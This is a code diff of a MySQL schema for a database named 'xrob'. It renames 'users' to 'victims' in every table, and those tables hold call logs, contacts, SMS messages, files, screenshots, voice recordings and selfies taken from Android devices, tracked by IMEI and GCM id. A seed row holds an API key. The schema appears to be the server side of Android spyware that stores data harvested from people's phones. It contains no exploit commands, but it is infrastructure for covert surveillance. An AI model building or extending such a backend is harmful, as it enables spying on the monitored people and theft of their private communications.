@@ -20,7 +20,7 @@ USE `xrob`;
 DROP TABLE IF EXISTS `calls`;
 CREATE TABLE IF NOT EXISTS `calls` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `name` varchar(100) DEFAULT NULL,
   `phone` varchar(20) NOT NULL,
   `call_type` enum('IN','OUT','MISSED') NOT NULL,
@@ -28,8 +28,8 @@ CREATE TABLE IF NOT EXISTS `calls` (
   `is_active` tinyint(4) NOT NULL DEFAULT '1',
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `calls_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `calls_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- Data exporting was unselected.
@@ -39,14 +39,14 @@ CREATE TABLE IF NOT EXISTS `calls` (
 DROP TABLE IF EXISTS `contacts`;
 CREATE TABLE IF NOT EXISTS `contacts` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `android_contact_id`  INTEGER  NOT NULL,
   `name` varchar(100) DEFAULT NULL,
   `is_active` tinyint(4) NOT NULL DEFAULT '1',
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `contacts_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `contacts_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 DROP TABLE IF EXISTS `contact_names_audit`;
@@ -78,7 +78,7 @@ CREATE TABLE IF NOT EXISTS `phone_numbers`(
 DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `data_type` enum('messages','call_logs','contacts','file_logs','media_screen_shot','media_voice','media_selfie') NOT NULL,
   `error` tinyint(4) NOT NULL,
   `message` text NOT NULL,
@@ -86,8 +86,8 @@ CREATE TABLE IF NOT EXISTS `deliveries` (
   `server_error_message` text DEFAULT NULL,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `deliveries_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `deliveries_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- Data exporting was unselected.
@@ -97,15 +97,15 @@ CREATE TABLE IF NOT EXISTS `deliveries` (
 DROP TABLE IF EXISTS `files`;
 CREATE TABLE IF NOT EXISTS `files` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `real_filename` text NOT NULL,
   `file_path` text NOT NULL,
   `size` int(11) NOT NULL,
   `is_active` tinyint(4) NOT NULL DEFAULT '1',
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `files_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `files_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- Data exporting was unselected.
@@ -115,15 +115,15 @@ CREATE TABLE IF NOT EXISTS `files` (
 DROP TABLE IF EXISTS `media`;
 CREATE TABLE IF NOT EXISTS `media` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `name` varchar(100) NOT NULL,
   `_type` enum('SCREENSHOT','VOICE','SELFIE') NOT NULL,
   `captured_at` timestamp NULL,
   `is_active` tinyint(4) NOT NULL DEFAULT '1',
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `media_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `media_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- Data exporting was unselected.
@@ -133,23 +133,23 @@ CREATE TABLE IF NOT EXISTS `media` (
 DROP TABLE IF EXISTS `messages`;
 CREATE TABLE IF NOT EXISTS `messages` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `user_id` int(11) NOT NULL,
+  `victim_id` int(11) NOT NULL,
   `phone` varchar(20) NOT NULL,
   `content` text NOT NULL,
   `_type` ENUM ('inbox','outbox') NOT NULL,
   `delivered_at` BIGINT NOT NULL,
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  KEY `user_id` (`user_id`),
-  CONSTRAINT `messages_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
+  KEY `victim_id` (`victim_id`),
+  CONSTRAINT `messages_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- Data exporting was unselected.
 
 
--- Dumping structure for table xrob.users
-DROP TABLE IF EXISTS `users`;
-CREATE TABLE IF NOT EXISTS `users` (
+-- Dumping structure for table xrob.victims
+DROP TABLE IF EXISTS `victims`;
+CREATE TABLE IF NOT EXISTS `victims` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `name` varchar(100) DEFAULT NULL,
   `gcm_id` text,
@@ -163,7 +163,7 @@ CREATE TABLE IF NOT EXISTS `users` (
   UNIQUE KEY `imei` (`imei`)
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
-  INSERT INTO users (name,api_key,imei) VALUES ('Shifar','YRxxhK7pIi',12345678);
+  INSERT INTO victims (name,api_key,imei) VALUES ('Shifar','YRxxhK7pIi',12345678);
 
   /* Change the delimiter so we can use ";" within the CREATE TRIGGER */
     DELIMITER $$
